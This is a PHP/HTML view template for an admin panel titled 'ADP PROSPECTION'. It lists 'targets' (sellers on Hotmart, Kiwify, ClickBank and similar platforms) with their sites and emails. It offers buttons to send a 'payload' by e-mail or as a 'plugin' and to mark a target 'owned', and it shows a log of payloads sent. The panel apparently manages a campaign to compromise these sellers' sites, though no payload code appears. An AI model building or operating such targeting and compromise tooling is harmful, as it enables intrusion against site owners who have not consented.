<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ADP PROSPECTION</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>

<?php


function getLabel($plataforma)
{

    if ($plataforma == 1) {
        return "Hotmart";
    } else if ($plataforma == 2) {
        return "Kiwify";
    } else if ($plataforma == 3) {
        return "Monetizze";
    } else if ($plataforma == 4) {
        return "ClickBank";
    } else if ($plataforma == 5) {
        return "Braip";
    } else if ($plataforma == 6) {
        return "Braip";
    } else {
        return "Desconhecida";
    }
}

?>

<body style="background-color:#000">

    <section class="" style="margin: 50px; margin-top:50px;">
        <div class="container-fluid">
            <div class="row">
                <div class="col-sm-2 text-black">
                    <?php $this->load->view('comp/menu'); ?>
                </div>



                <div class="col-sm-10 px-0 d-none d-sm-block">
                    <div style="margin:50px;margin-top:10px">
                        <a href="<?= base_url() ?>painel/adp_prospection_list">
                            <button class="btn btn-outline-light"><i style="color:#fff" class="fa fa-arrow-left"></i></button>
                        </a>
                    </div>
                    <div style="margin:50px;margin-top:10px">

                        <div class=" mt-5">

                            <div class="row">
                                <div class="col-8 col-md-8">
                                    <h6 class="text-white">ADEPTO</h6>
                                    <small class="text-white"><strong><?= getLabel($alvo['alvo_plataforma']) ?></strong></small>
                                    <p class="text-danger"><strong><?= $alvo['alvo_nome'] ?></strong> <small> | <a target="_blank" href="https://<?= $alvo['alvo_url'] ?>"><strong><?= $alvo['alvo_url'] ?></small></a></p>


                                    <p class="text-white mt-3"><strong><?= $alvo['alvo_email'] ?></strong></p>
                                </div>
                                <div class="col-4 col-md-4">

                                    <?php if ($alvo['alvo_owned'] == 0) { ?>
                                        <button onclick="update_owned(<?= $alvo['id'] ?>, 1)" class="btn btn-success">MARK AS OWNED</button>
                                    <?php } else { ?>
                                        <button onclick="update_owned(<?= $alvo['id'] ?>, 0)" class="btn btn-danger">MARK AS NO-OWNED</button>

                                    <?php } ?>

                                </div>
                            </div>
                        </div>
                        <div class="row gap-5 mt-5">
                            <div class="col-12 col-md-4">
                                <h6 class="text-white">PAYLOAD E-MAIL</h6>

                                <button class="enviar-payload btn btn-primary  mt-3" nome="<?= $alvo['alvo_nome'] ?>" ref="<?= $alvo['alvo_ref'] ?>" email="<?= $alvo['alvo_email'] ?>" url="<?= $alvo['alvo_url'] ?>" language="pt"> <small>ENVIAR PAYLOAD [E-MAIL] PT</small></button>
                                <br>
                                <button class="enviar-payload btn btn-primary mt-3" nome="<?= $alvo['alvo_nome'] ?>" ref="<?= $alvo['alvo_ref'] ?>" email="<?= $alvo['alvo_email'] ?>" url="<?= $alvo['alvo_url'] ?>" language="en"> <small>ENVIAR PAYLOAD [E-MAIL] ENG</small></button>
                            </div>
                            <div class="col-12 col-md-4">
                                <h6 class="text-white">PAYLOAD PLUGIN</h6>
                                <button class="enviar-payload-dois btn btn-success mt-3" nome="<?= $alvo['alvo_nome'] ?>" ref="<?= $alvo['alvo_ref'] ?>" email="<?= $alvo['alvo_email'] ?>" url="<?= $alvo['alvo_url'] ?>" language="pt"> <small>ENVIAR PAYLOAD [PLUGINS] PT</small></button>
                                <br>
                                <button class="enviar-payload-dois btn btn-success mt-3" nome="<?= $alvo['alvo_nome'] ?>" ref="<?= $alvo['alvo_ref'] ?>" email="<?= $alvo['alvo_email'] ?>" url="<?= $alvo['alvo_url'] ?>" language="en"> <small>ENVIAR PAYLOAD [PLUGINS] ENG</small></button>
                            </div>

                        </div>
                        <div class="mt-5">

                            <h6 class="text-white">LOGS</h6>


                            <table class="w-100 p-3 mt-3">

                                <thead class="bg-danger mb-3 p-3">
                                    <tr class="text-white text-center mb-3 p-3">
                                        <th style="font-size: 12px;text-align:center" scope="col">URL</th>
                                        <th style="font-size: 12px;text-align:center" scope="col">EMAIL</th>
                                        <th style="font-size: 12px;text-align:center" scope="col">TIPO</th>
                                        <th style="font-size: 12px;text-align:center" scope="col">PAYLOAD</th>
                                        <th style="font-size: 12px;text-align:center" scope="col">IDIOMA</th>

                                        <th style="font-size: 12px;text-align:center" scope="col">DATA</th>

                                    </tr>
                                </thead>

                                <?php foreach ($this->main_model->get_logs_by_domain($alvo['alvo_url']) as $log) {  ?>

                                    <tr style="font-size:12px;text-transform:uppercase;color:#FFF;padding:5px" class="text-center ">
                                        <td><?= $log->log_url ?></td>
                                        <td><?= $log->log_email ?></td>
                                        <td><?= $log->log_type ?></td>
                                        <td><?= $log->log_payload ?></td>
                                        <td><?= $log->log_language ?></td>
                                        <td><?= date('d/m/Y H:i:s', strtotime($log->log_data)) ?></td>
                                    </tr>

                                <?php } ?>

                            </table>
                        </div>
                    </div>

                </div>
            </div>
        </div>
    </section>


    <div class="modal fade" id="modal_update_target" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="adp_title">ATUALIZAR TARGET</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <div>
                        <form id="form_update_target" action="">
                            <input required class="form-control" type="hidden" name="id" id="update_target_id">

                            <label for="">NOME</label><br>
                            <input required class="form-control" type="text" name="alvo_nome" id="update_target_alvo_nome">
                            <br>
                            <div class="row">
                                <div class="col-md-6">
                                    <label for="">SITE</label><br>
                                    <input required class="form-control" type="text" name="alvo_url" id="update_target_alvo_url">
                                    <br>
                                </div>
                                <div class="col-md-6">
                                    <label for="">PÁGINA DE VENDAS</label><br>
                                    <input required class="form-control" type="text" name="alvo_produto_link" id="update_target_alvo_produto_link">
                                    <br>
                                </div>
                            </div>
                            <label for="">EMAIL</label><br>
                            <input required class="form-control" type="email" name="alvo_email" id="update_target_alvo_email">
                            <br>
                            <label for="">PLATAFORMA</label><br>

                            <select required class="custom-select" style="width:250px;height:50px" name="alvo_plataforma" id="update_target_alvo_plataforma">
                                <option value="1" selected>Hotmart</option>
                                <option value="2">Kiwify</option>
                                <option value="3">Monetizze</option>
                                <option value="4">ClickBank</option>
                                <option value="5">Braip</option>
                            </select>
                            <br>
                            <label for="">INAPTO</label><br>

                            <select required class="custom-select" style="width:250px;height:50px" name="inapto" id="update_target_alvo_inapto">
                                <option value="1" selected>SIM</option>
                                <option value="0">NÃO</option>

                            </select>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">FECHAR</button>
                    <button type="submit" class="btn btn-primary">ATUALIZAR</button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="modal_add_target" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="adp_title">ADICIONAR TARGET</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <div>
                        <form id="form_add_target" action="">
                            <label for="">NOME</label><br>
                            <input required class="form-control" type="text" name="alvo_nome">
                            <br>
                            <div class="row">
                                <div class="col-md-6">
                                    <label for="">SITE</label><br>
                                    <input required class="form-control" type="text" name="alvo_url">
                                    <br>
                                </div>
                                <div class="col-md-6">
                                    <label for="">PÁGINA DE VENDAS</label><br>
                                    <input required class="form-control" type="text" name="alvo_produto_link">
                                    <br>
                                </div>
                            </div>
                            <label for="">EMAIL</label><br>
                            <input required class="form-control" type="email" name="alvo_email">
                            <br>
                            <label for="">PLATAFORMA</label><br>

                            <select required class="custom-select" style="width:250px;height:50px" name="alvo_plataforma">
                                <option value="1" selected>Hotmart</option>
                                <option value="2">Kiwify</option>
                                <option value="3">Monetizze</option>
                                <option value="4">ClickBank</option>
                                <option value="5">Braip</option>
                            </select>
                    </div>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">FECHAR</button>
                    <button type="submit" class="btn btn-primary">ADICIONAR</button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js" integrity="sha512-AA1Bzp5Q0K1KanKKmvN/4d3IRKVlv9PYgwFPvm32nPO6QS8yH1HO7LbgB1pgiOxPtfeg5zEn2ba64MUcqJx6CA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>


    <script>
        $('.enviar-payload').on('click', function(e) {

            var nome = $(this).attr('nome')
            var email = $(this).attr('email')
            var url = $(this).attr('url')
            var ref = $(this).attr('ref')
            var language = $(this).attr('language')
            // console.log(nome)

            $.ajax({
                method: 'POST',
                url: '<?= base_url() ?>alvos/act_send_payload',
                data: {
                    alvo_url: url,
                    alvo_email: email,
                    alvo_nome: nome,
                    alvo_ref: ref,
                    alvo_language: language
                },
                success: function(data) {
                    var resp = JSON.parse(data)

                    if (resp.status == "true") {

                        swal({
                            title: 'Sucesso!',
                            text: resp.message,
                            icon: 'success',
                            confirmButtonText: 'Entendi'
                        }).then((e) => {
                            location.reload()
                        })

                    } else {
                        swal({
                            title: 'Sucesso!',
                            text: resp.message,
                            icon: 'warning',
                            confirmButtonText: 'Entendi'
                        })
                    }
                },
                error: function(data) {
                    swal({
                        title: 'erro!',
                        text: 'erro ao enviar',
                        icon: 'error',
                        confirmButtonText: 'Entendi'
                    })
                },
            });
        })


        $('.enviar-payload-dois').on('click', function(e) {

            var nome = $(this).attr('nome')
            var email = $(this).attr('email')
            var url = $(this).attr('url')
            var ref = $(this).attr('ref')
            var language = $(this).attr('language')


            // console.log(nome)


            $.ajax({
                method: 'POST',
                url: '<?= base_url() ?>alvos/act_send_payload_dois',
                data: {
                    alvo_url: url,
                    alvo_email: email,
                    alvo_nome: nome,
                    alvo_ref: ref,
                    alvo_language: language
                },
                success: function(data) {
                    var resp = JSON.parse(data)

                    if (resp.status == "true") {

                        swal({
                            title: 'Sucesso!',
                            text: resp.message,
                            icon: 'success',
                            confirmButtonText: 'Entendi'
                        }).then((e) => {
                            location.reload()
                        })

                    } else {
                        swal({
                            title: 'Sucesso!',
                            text: resp.message,
                            icon: 'warning',
                            confirmButtonText: 'Entendi'
                        })
                    }
                },
                error: function(data) {
                    swal({
                        title: 'erro!',
                        text: 'erro ao enviar',
                        icon: 'error',
                        confirmButtonText: 'Entendi'
                    })
                },
            });
        })


        function update_owned(id, status) {
            $.ajax({
                method: 'POST',
                url: '<?= base_url() ?>alvos/act_update_owned',
                data: {
                    id: id,
                    status: status,
                  
                },
                success: function(data) {
                    var resp = JSON.parse(data)

                    if (resp.status == "true") {

                         location.reload()

                    } else {
                        swal({
                            title: 'Erro!',
                            text: resp.message,
                            icon: 'warning',
                            confirmButtonText: 'Entendi'
                        })
                    }
                },
                error: function(data) {
                    swal({
                        title: 'erro!',
                        text: 'erro ao enviar',
                        icon: 'error',
                        confirmButtonText: 'Entendi'
                    })
                },
            });
        }
    </script>


</body>

</html>